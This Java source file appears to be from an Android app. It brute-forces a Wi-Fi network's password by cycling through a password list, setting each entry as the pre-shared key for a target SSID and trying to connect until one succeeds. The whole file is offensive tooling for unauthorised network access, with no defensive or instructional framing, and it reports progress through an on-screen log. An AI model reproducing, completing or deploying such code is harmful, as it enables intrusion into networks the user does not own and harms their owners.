package BruteFragment;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;

import java.util.List;
import java.util.Objects;

import androidx.fragment.app.FragmentManager;
import logic.ShowToast;

public class BruteProccess extends AsyncTask {

    private List<String> passwordList;

    private WifiManager wifiManager;
    private WifiConfiguration wifiConfiguration;

    private String currentBruteWifiSSID;

    private int netId;

    private FragmentManager fragmentManager;

    private ConnectivityManager connectivityManager;
    private NetworkInfo networkInfo;

    private SetLog setLog;

    BruteProccess(List<String> passwordList, WifiManager wifiManager, WifiConfiguration wifiConfiguration,
                  String currentBruteWifiSSID, FragmentManager fragmentManager, ConnectivityManager connectivityManager, NetworkInfo networkInfo) {
        this.currentBruteWifiSSID = currentBruteWifiSSID;
        this.fragmentManager = fragmentManager;
        this.wifiConfiguration = wifiConfiguration;
        this.wifiManager = wifiManager;
        this.passwordList = passwordList;
        this.networkInfo = networkInfo;
        this.connectivityManager = connectivityManager;
    }

    void Brute() {

        /* Test */
        for (int i = 0; i < passwordList.size(); i++) {

            /* Remove wifi */
            wifiManager.removeNetwork(netId);

            /* Config */
            wifiConfiguration = new WifiConfiguration();
            wifiConfiguration.SSID = String.format("\"%s\"", currentBruteWifiSSID); /* Set wifi name */
            wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordList.get(i)); /* Set current password */
            /*  */

            /* Try connect */
            netId = wifiManager.addNetwork(wifiConfiguration);
            wifiManager.disconnect();
            wifiManager.enableNetwork(netId, true);
            wifiManager.reconnect();
            /*    */

            publishProgress(i);

            if (CheckSuccessConnect())
                break;

        }
    }

    @Override
    protected Object doInBackground(Object[] objects) {

        Brute();
        return null;
    }

    @Override
    protected void onPostExecute(Object o) {
        super.onPostExecute(o);
        setLog.SetLogResult("Finish brute wifi:" + currentBruteWifiSSID);
    }

    @Override
    protected void onProgressUpdate(Object[] values) {
        super.onProgressUpdate(values);
        setLog = new SetLog(fragmentManager);
        setLog.SetLogBruteProgress("Brute progress " + values[0].toString() + " with < " + passwordList.size() + " passwords");
    }

    /* Check success connection */
    private boolean CheckSuccessConnect() {
        return Objects.requireNonNull(networkInfo).isConnected();
    }

}

